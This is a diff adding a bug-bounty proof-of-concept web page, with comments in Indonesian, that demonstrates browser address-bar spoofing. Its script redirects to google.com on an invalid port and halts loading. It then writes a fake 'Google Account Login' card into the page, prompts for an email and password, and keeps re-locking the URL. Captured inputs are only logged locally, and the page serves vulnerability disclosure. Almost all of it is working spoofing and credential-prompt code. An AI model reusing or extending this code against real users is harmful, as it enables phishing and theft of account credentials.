@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <meta
+    name="viewport"
+    content="width=device-width, initial-scale=1"
+  />
+  <title>PoC – Address Bar Lock & Fake Content (Demo)</title>
+  <style>
+    body { font-family: Arial, system-ui, -apple-system, sans-serif; margin: 0; }
+    .banner {
+      background: #fff3cd;
+      color: #664d03;
+      border-bottom: 1px solid #ffe69c;
+      padding: 10px 14px;
+      font-size: 14px;
+    }
+    .center { text-align: center; }
+    .muted { color: #6b7280; }
+    .hidden { display: none; }
+    .content {
+      max-width: 720px;
+      margin: 32px auto;
+      padding: 0 16px;
+    }
+    .card {
+      margin: 24px auto 0;
+      padding: 24px;
+      border-radius: 12px;
+      box-shadow: 0 8px 30px rgba(0,0,0,.08);
+      border: 1px solid #e5e7eb;
+    }
+    img.logo { margin-top: 20px; height: 48px; }
+    h1 { margin: 12px 0 8px; font-size: 22px; }
+    p { margin: 6px 0; }
+    .note { margin-top: 12px; font-size: 12px; }
+    iframe.warmup { display: none; }
+  </style>
+</head>
+<body>
+  <div class="banner">
+    <strong>Demo PoC:</strong> hanya untuk pengujian & pelaporan bug bounty. Jangan masukkan kredensial asli.
+  </div>
+
+  <div class="content">
+    <h2>Halo</h2>
+    <p class="muted">
+      PoC ini mensimulasikan penguncian address bar via redirect ke port tidak valid,
+      menghentikan loading, lalu menulis konten palsu di dokumen.
+    </p>
+
+    <!-- Multiple iframe warmups using /csi/ to bypass iOS rendering block -->
+    <iframe class="warmup" src="https://www.google.com/csi"></iframe>
+    <iframe class="warmup" src="https://www.google.com/csi"></iframe>
+    <iframe class="warmup" src="https://www.google.com/favicon.ico"></iframe>
+
+    <div id="placeholder" class="card center">
+      <p class="muted">Menyiapkan demo…</p>
+    </div>
+  </div>
+
+  <script>
+    (function () {
+      // Konfigurasi timing – sesuaikan jika perlu
+      const WARMUP_DELAY_MS   = 500;   // jeda awal sebelum mulai
+      const REDIRECT_DELAY_MS = 2000;  // waktu tunggu setelah redirect error sebelum inject
+      const PROMPT_DELAY_MS   = 1200;  // jeda setelah inject sebelum dialog demo
+      const RELock_INTERVAL   = 3000;  // interval relock URL (opsional)
+
+      // Target yang digunakan untuk "mengunci" address bar (port tidak valid)
+      const LOCK_URL = "https://www.google.com:8080/csi";
+
+      // Konten palsu (DEMO) yang akan di-inject
+      const attackerContent = `
+        <div class="content">
+          <div class="card center">
+            <img
+              class="logo"
+              src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png"
+              alt="Google Logo"
+            />
+            <h1>Google Account Login</h1>
+            <p class="muted">DEMO PoC – jangan masukkan kredensial asli.</p>
+            <p class="note">Konten ini ditulis via <code>document.write()</code> setelah <code>window.stop()</code>.</p>
+          </div>
+        </div>
+      `;
+
+      // Util: tulis konten ke dokumen saat ini (setelah window.stop)
+      function injectDemoContent(html) {
+        try {
+          document.open();
+          document.write(html);
+          document.close();
+        } catch (e) {
+          console.error("Inject gagal:", e);
+        }
+      }
+
+      // Util: dialog demo (tanpa menyimpan/mengekfiltrasi data)
+      function showDemoDialogs() {
+        alert("Demo: PoC menampilkan dialog. Jangan masukkan data sensitif.");
+        // Gunakan prompt dummy — tidak disimpan / tidak dikirim ke mana pun
+        const demoEmail = prompt("DEMO – masukkan email (opsional):", "user@example.com");
+        const demoPass  = prompt("DEMO – masukkan password (opsional):", "not-a-real-password");
+        // Hanya log ke console lokal untuk keperluan demo
+        console.log("DEMO inputs:", { demoEmail, demoPass });
+      }
+
+      // Jalankan urutan PoC
+      setTimeout(() => {
+        // Step 1: Redirect ke port tidak valid untuk "mengunci" address bar
+        try {
+          top.location = LOCK_URL;
+        } catch (e) {
+          console.warn("Gagal set top.location:", e);
+        }
+
+        setTimeout(() => {
+          // Step 2: Fokus + hentikan loading + inject konten demo
+          try { window.focus(); } catch (_) {}
+          try { window.stop(); } catch (_) {}
+
+          injectDemoContent(attackerContent);
+
+          // Step 3: Setelah render, tampilkan dialog demo
+          setTimeout(() => {
+            showDemoDialogs();
+
+            // Step 4 (opsional): Relock URL berkala untuk mencegah reset
+            setInterval(() => {
+              try { top.location = LOCK_URL; } catch (_) {}
+            }, RELock_INTERVAL);
+          }, PROMPT_DELAY_MS);
+        }, REDIRECT_DELAY_MS);
+      }, WARMUP_DELAY_MS);
+    })();
+  </script>
+</body>
+</html>
